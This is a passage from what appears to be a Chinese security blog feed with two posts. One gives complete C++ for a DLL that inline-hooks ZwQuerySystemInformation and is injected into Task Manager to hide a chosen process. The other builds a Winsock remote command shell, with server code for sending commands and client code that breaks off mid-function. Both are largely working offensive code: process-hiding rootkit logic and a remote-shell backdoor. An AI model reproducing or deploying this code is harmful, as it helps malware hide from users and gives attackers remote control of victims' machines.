class="hljs-params">(WINAPI* typedef_ZwQuerySystemInformation)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Inout_   PVOID                    SystemInformation,</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      ULONG                    SystemInformationLength,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Out_opt_ PULONG                   ReturnLength</span></span><br><span class="hljs-params"><span class="hljs-function">        )</span></span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* typedef_ZwQuerySystemInformation)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Inout_   PVOID                    SystemInformation,</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      ULONG                    SystemInformationLength,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Out_opt_ PULONG                   ReturnLength</span></span><br><span class="hljs-params"><span class="hljs-function">        )</span></span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    typedef_ZwQuerySystemInformation ZwQuerySystemInformation = (typedef_ZwQuerySystemInformation)::<span class="hljs-built_in">GetProcAddress</span>(hntdll, <span class="hljs-string">&quot;ZwQuerySystemInformation&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!ZwQuerySystemInformation) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Get ZwQuerySystemInformation Addr Faild..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN64</span><br>    BYTE pData[<span class="hljs-number">12</span>] = &#123; <span class="hljs-number">0x48</span>,<span class="hljs-number">0xb8</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0xFF</span>,<span class="hljs-number">0xE0</span> &#125;;<br>    ULONGLONG InfoAddr = (ULONGLONG)New_ZwQuerySystemInformation;<br>    ::<span class="hljs-built_in">RtlCopyMemory</span>(&amp;pData[<span class="hljs-number">2</span>], &amp;InfoAddr, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(InfoAddr));<br>    <span class="hljs-comment">// 保存前 12 字节数据</span><br>    ::<span class="hljs-built_in">RtlCopyMemory</span>(g_Oldwin64, ZwQuerySystemInformation, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(pData));<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    BYTE pData[<span class="hljs-number">5</span>] = &#123; <span class="hljs-number">0xe9</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span> &#125;;<br>    <span class="hljs-comment">//算出偏移地址</span><br>    DWORD dwOffeset = (DWORD)New_ZwQuerySystemInformation - (DWORD)ZwQuerySystemInformation - <span class="hljs-number">5</span>;<br>    <span class="hljs-comment">//得到完整的pData</span><br>    <span class="hljs-built_in">RtlCopyMemory</span>(&amp;pData[<span class="hljs-number">1</span>], &amp;dwOffeset, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(dwOffeset));<br>    <span class="hljs-comment">//保存原来的硬编码</span><br>    <span class="hljs-built_in">RtlCopyMemory</span>(g_Oldwin32, ZwQuerySystemInformation, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(pData));<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> </span><br>    DWORD dwOldProtect = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">//修改为可写属性,不然会0xC00005访问错误</span><br>    <span class="hljs-built_in">VirtualProtect</span>(ZwQuerySystemInformation, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(pData), PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);<br>    <span class="hljs-comment">//修改硬编码</span><br>    <span class="hljs-built_in">RtlCopyMemory</span>(ZwQuerySystemInformation, pData, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(pData));<br>    <span class="hljs-comment">//还原保护属性</span><br>    <span class="hljs-built_in">VirtualProtect</span>(ZwQuerySystemInformation, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(pData), dwOldProtect, &amp;dwOldProtect);<br>&#125;<br></code></pre></td></tr></table></figure><p>unhook函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unhookZwQuerySystemInformation</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//获取ZwQuerySystemInformation的地址</span><br>    HMODULE hntdll = <span class="hljs-built_in">LoadLibraryA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!hntdll) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Load ntdll Faild..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN64</span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* typedef_ZwQuerySystemInformation)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Inout_   PVOID                    SystemInformation,</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      ULONG                    SystemInformationLength,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Out_opt_ PULONG                   ReturnLength</span></span><br><span class="hljs-params"><span class="hljs-function">        )</span></span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* typedef_ZwQuerySystemInformation)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Inout_   PVOID                    SystemInformation,</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      ULONG                    SystemInformationLength,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Out_opt_ PULONG                   ReturnLength</span></span><br><span class="hljs-params"><span class="hljs-function">        )</span></span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    typedef_ZwQuerySystemInformation ZwQuerySystemInformation = (typedef_ZwQuerySystemInformation)::<span class="hljs-built_in">GetProcAddress</span>(hntdll, <span class="hljs-string">&quot;ZwQuerySystemInformation&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!ZwQuerySystemInformation) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Get ZwQuerySystemInformation Addr Faild..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    DWORD dwOldProtect = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">//方便就直接改12个字节的可写属性</span><br>    <span class="hljs-built_in">VirtualProtect</span>(ZwQuerySystemInformation, <span class="hljs-number">12</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);<br>    <span class="hljs-comment">//还原原来的硬编码</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN64</span><br>    <span class="hljs-built_in">RtlCopyMemory</span>(ZwQuerySystemInformation, g_Oldwin64, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(g_Oldwin64));<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    <span class="hljs-built_in">RtlCopyMemory</span>(ZwQuerySystemInformation, g_Oldwin32, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(g_Oldwin32));<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> </span><br>    <span class="hljs-comment">//还原属性</span><br>    <span class="hljs-built_in">VirtualProtect</span>(ZwQuerySystemInformation, <span class="hljs-number">12</span>, dwOldProtect, &amp;dwOldProtect);<br>&#125;<br></code></pre></td></tr></table></figure><p>自己可控的函数,即<code>New_ZwQuerySystemInformation</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">NTSTATUS WINAPI <span class="hljs-title">New_ZwQuerySystemInformation</span><span class="hljs-params">(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)</span></span><br><span class="hljs-function"></span>&#123;<br>    NTSTATUS status = <span class="hljs-literal">NULL</span>;<br>    PSYSTEM_PROCESS_INFORMATION pCur = <span class="hljs-literal">NULL</span>, pPrev = <span class="hljs-literal">NULL</span>;<br>    DWORD dwHideProcessId = <span class="hljs-number">29936</span>;<br>    <span class="hljs-comment">//先卸载钩子</span><br>    <span class="hljs-built_in">unhookZwQuerySystemInformation</span>();<br><br>    <span class="hljs-comment">// 获取 ntdll.dll 的加载基址, 若没有则返回</span><br>    HMODULE hntdll = <span class="hljs-built_in">LoadLibraryA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!hntdll) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Load ntdll Faild..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> status;<br>    &#125;<br>    <span class="hljs-comment">// 获取 ZwQuerySystemInformation 函数地址</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN64</span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* typedef_ZwQuerySystemInformation)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Inout_   PVOID                    SystemInformation,</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      ULONG                    SystemInformationLength,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Out_opt_ PULONG                   ReturnLength</span></span><br><span class="hljs-params"><span class="hljs-function">        )</span></span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* typedef_ZwQuerySystemInformation)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Inout_   PVOID                    SystemInformation,</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      ULONG                    SystemInformationLength,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Out_opt_ PULONG                   ReturnLength</span></span><br><span class="hljs-params"><span class="hljs-function">        )</span></span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    typedef_ZwQuerySystemInformation ZwQuerySystemInformation = (typedef_ZwQuerySystemInformation)::<span class="hljs-built_in">GetProcAddress</span>(hntdll, <span class="hljs-string">&quot;ZwQuerySystemInformation&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!ZwQuerySystemInformation) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Get ZwQuerySystemInformation Addr Faild..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> status;<br>    &#125;<br>    <span class="hljs-comment">//调用原来的函数,第二个参数是返回请求的信息</span><br>    status = <span class="hljs-built_in">ZwQuerySystemInformation</span>(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">NT_SUCCESS</span>(status) &amp;&amp; <span class="hljs-number">5</span> == SystemInformationClass)<br>    &#123;<br>        pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;<br>        <span class="hljs-keyword">while</span> (TRUE)<br>        &#123;<br>            <span class="hljs-comment">// 判断是否是要隐藏的进程PID,是就把该进程信息删除</span><br>            <span class="hljs-keyword">if</span> (dwHideProcessId == (DWORD)pCur-&gt;UniqueProcessId)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> == pCur-&gt;NextEntryOffset)<br>                &#123;<br>                    pPrev-&gt;NextEntryOffset = <span class="hljs-number">0</span>;<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    pPrev-&gt;NextEntryOffset = pPrev-&gt;NextEntryOffset + pCur-&gt;NextEntryOffset;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                pPrev = pCur;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> == pCur-&gt;NextEntryOffset)<br>            &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            pCur = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)pCur + pCur-&gt;NextEntryOffset);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//挂钩</span><br>    <span class="hljs-built_in">hookZwQuerySystemInformation</span>();<br>    <span class="hljs-keyword">return</span> status;<br>&#125;<br></code></pre></td></tr></table></figure><p>以上函数全部写在dll中,<code>dllmain</code>主函数:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        <span class="hljs-built_in">hookZwQuerySystemInformation</span>();<br>        g_hModule = hModule;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-built_in">unhookZwQuerySystemInformation</span>();<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><ul><li>win10</li><li>64位dll</li><li>Injectdll(进程注入程序)</li><li>Taskmgr.exe</li></ul><p>要注意的是dll的位数。<br>找到任务管理器pid:<br><img src="/img/HOOKZwQuerySystemInformation/5.png"></p><p>这里选择隐藏QQ程序<br><img src="/img/HOOKZwQuerySystemInformation/6.png"></p><p>注入程序后<br><img src="/img/HOOKZwQuerySystemInformation/7.png"></p><p><img src="/img/HOOKZwQuerySystemInformation/8.png"></p><p>可以看到QQ进程信息已经剔除</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>如何将所有进程钩住?<br>使用全局钩子,这里我认为是两个知识点,就不继续展开说了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>socket之shell实现</title>
    <link href="/2021/06/21/RemoteCmd/"/>
    <url>/2021/06/21/RemoteCmd/</url>
    
    <content type="html"><![CDATA[<h2 id="Socket"><a href="#Socket" class="headerlink" title="Socket"></a>Socket</h2><p>Socket中文为”套接字”,实际上是windows的API,程序员无需知道<code>TCP/IP</code>的细节可直接调用网络编程接口,Socket中有两种通信协议可供选择</p><ul><li>TCP</li><li>UDP<br>TCP是安全的,在传输数据前必须建立连接,这个连接实际上是三次握手;UDP则是不安全的,但是他的效率是比TCP要高的,QQ实际上就是使用UDP协议<br>思路是非常简单的</li></ul><ol><li>Socket建立通信</li><li>客户端执行命令并返回结果</li></ol><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>服务端(监听端):<br>服务器端初始化<code>Winsock</code>环境后，便调用Socket丽数创建流式套接字;然后对<code>sockadd_in</code>结构体进行设置，设置服务器绑定的IP地址和端口等信息并调用<code>bind</code>函数来绑定;绑定成功后，就可以调用<code>listen</code>函数设置连接数量，并进行监听。直到有来自客户端的连接请求，服务器便调用<code>accept</code>函数接受连接请求，建立连接。这时，可以使用<code>recv</code>函数和<code>send</code>函数与客户端进行数据收发</p><p>客户端(接收端):<br>客户端初始化环境后,便调用Socket函数创建流式套接字;然后对<code>sockaddr_in</code>结构体进行设置，设置服务器的IP地址和端口等信息并调用<code>connect</code>函数向服务器发送连接请求，并等待服务器响应。服务器接受连接请求后，就成功地与服务器建立连接，这时，可以使用<code>recv</code>函数和<code>send</code>函数与客户端进行数据收发。</p><p>为了方便理解画一个图<br><img src="/img/socket/1.png"></p><h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>创建一个函数,实现服务端的winsock初始化,创建流式socket,绑定服务端地址和端口和监听</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">SocketListen</span><span class="hljs-params">(LPSTR ipaddr,<span class="hljs-keyword">int</span> port)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//初始化winsock环境</span><br>    WSADATA wsadata = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">WSAStartup</span>(<span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsadata) == SOCKET_ERROR) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Failed to initialize Winsock character environment..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//创建流式socket</span><br>    g_SeverSocket = <span class="hljs-built_in">socket</span>(AF_INET,SOCK_STREAM,<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (g_SeverSocket == INVALID_SOCKET)<br>    &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Socket Failed..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//设置服务端地址和端口</span><br>    sockaddr_in ServerAddr;<br>    ServerAddr.sin_family = AF_INET;<br>    ServerAddr.sin_port = ::<span class="hljs-built_in">htons</span>(port);<br>    ServerAddr.sin_addr.S_un.S_addr = ::<span class="hljs-built_in">inet_addr</span>(ipaddr);<br>    <span class="hljs-comment">//绑定端口ip</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> != ::<span class="hljs-built_in">bind</span>(g_SeverSocket, (LPSOCKADDR)&amp;ServerAddr, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(ServerAddr))) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] bind Failed..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//设置监听,参数:已捆绑未连接的套接字描述字，正在等待连接的最大队列长度</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> != ::<span class="hljs-built_in">listen</span>(g_SeverSocket, <span class="hljs-number">1</span>)) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] listen Failed..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>再等待客户端的连接,如果<code>accept</code>到一个客户端,就让用户在命令行输入命令,并将命令发送给客户端。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">VOID <span class="hljs-title">AcceptRecvMsg</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    sockaddr_in addr = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-keyword">int</span> len = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(addr);<br>    <span class="hljs-comment">//接收客户端请求</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] Wait a Client connect..\n&quot;</span>;<br>    g_ClientSocket = ::<span class="hljs-built_in">accept</span>(g_SeverSocket, (LPSOCKADDR)&amp;addr, &amp;len);<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] a Client connect..\n&quot;</span>;<br>    <span class="hljs-keyword">char</span> szBuffer[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-keyword">while</span> (TRUE)<br>    &#123;<br>        <span class="hljs-comment">//接收用户输入并发送给客户端</span><br>        <span class="hljs-built_in">SendCommand</span>();<br>        <span class="hljs-comment">//接收数据</span><br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>        &#123;<br>            <span class="hljs-keyword">int</span> rRet = ::<span class="hljs-built_in">recv</span>(g_ClientSocket, szBuffer, MAX_PATH, <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">if</span> (rRet &lt;= <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            std::cout &lt;&lt; <span class="hljs-string">&quot;[+] recv:\n&quot;</span> &lt;&lt; szBuffer &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <br>    &#125;<br>&#125;<br><br><span class="hljs-function">VOID <span class="hljs-title">SendCommand</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> cmd[<span class="hljs-number">20</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot; &gt;&quot;</span>;<br>    cin.<span class="hljs-built_in">getline</span>(cmd, <span class="hljs-number">20</span>);<br>    ::<span class="hljs-built_in">send</span>(g_ClientSocket, cmd, <span class="hljs-number">1</span> + <span class="hljs-built_in">strlen</span>(cmd), <span class="hljs-literal">NULL</span>);<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] sent:&quot;</span> &lt;&lt; cmd &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>客户端只需要在初始化环境后与服务端<code>connect</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">connection</span><span class="hljs-params">(LPSTR ServerIP,<span class="hljs-keyword">int</span> ServerPort)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//初始化winsock环境</span><br>    WSADATA wsadata = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">WSAStartup</span>(<span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsadata) == SOCKET_ERROR) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Failed to initialize Winsock character environment..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//创建流式socket</span><br>    g_ClientSocket = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (g_ClientSocket == INVALID_SOCKET)<br>    &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Socket Failed..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//设置服务端地址和端口</span><br>    sockaddr_in ServerAddr;<br>    